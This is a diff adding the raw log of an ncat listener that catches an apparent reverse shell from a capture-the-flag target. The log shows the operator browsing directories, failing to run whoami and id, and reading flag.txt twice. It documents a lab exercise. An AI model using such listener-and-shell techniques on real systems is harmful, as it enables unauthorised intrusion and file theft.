@@ -1,0 +1,109 @@
+C:\Users\catsr\nmap-7.80-win32\nmap-7.80>ncat.exe -l -p 8080 -vvv
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+NCAT DEBUG: Initialized fdlist with 63 maxfds
+Ncat: Listening on :::8080
+NCAT DEBUG: Added fd 352 to list, nfds 1, maxfd 352
+Ncat: Listening on 0.0.0.0:8080
+NCAT DEBUG: Added fd 360 to list, nfds 2, maxfd 360
+NCAT DEBUG: Added fd 0 to list, nfds 3, maxfd 360
+NCAT DEBUG: Initialized fdlist with 60 maxfds
+NCAT DEBUG: selecting, fdmax 360
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 360 is ready
+Ncat: Connection from 152.14.92.89.
+NCAT DEBUG: Swapping fd[0] (352) with fd[2] (0)
+NCAT DEBUG: Removed fd 352 from list, nfds 2, maxfd 360
+NCAT DEBUG: Swapping fd[1] (360) with fd[1] (360)
+NCAT DEBUG: Removed fd 360 from list, nfds 1, maxfd 0
+Ncat: Connection from 152.14.92.89:48618.
+NCAT DEBUG: Added fd 356 to list, nfds 2, maxfd 356
+NCAT DEBUG: Added fd 356 to list, nfds 1, maxfd 356
+NCAT DEBUG: selecting, fdmax 356
+/bin/bash
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+/bin/cat /home/flag.txt
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 356 is ready
+flag{p3rm1ss10n_3xpl0it@t!0n}
+NCAT DEBUG: selecting, fdmax 356
+whoami
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 356 is ready
+/bin/bash: line 2: /usr/bin/whoami: Permission denied
+NCAT DEBUG: selecting, fdmax 356
+id
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 356 is ready
+/bin/bash: line 3: /usr/bin/id: Permission denied
+NCAT DEBUG: selecting, fdmax 356
+ls
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 356 is ready
+debug.sh
+NCAT DEBUG: selecting, fdmax 356
+cd /home
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+ls
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 356 is ready
+ctfuser
+flag.txt
+notes.txt
+NCAT DEBUG: selecting, fdmax 356
+cd ctfuser
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+ls
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+cd /opt
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+ls
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+cd /home
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+ls
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 356 is ready
+ctfuser
+flag.txt
+notes.txt
+NCAT DEBUG: selecting, fdmax 356
+cat flag.txt
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 0 is ready
+NCAT DEBUG: selecting, fdmax 356
+NCAT DEBUG: select returned 1 fds ready
+NCAT DEBUG: fd 356 is ready
+flag{p3rm1ss10n_3xpl0it@t!0n}
+NCAT DEBUG: selecting, fdmax 356
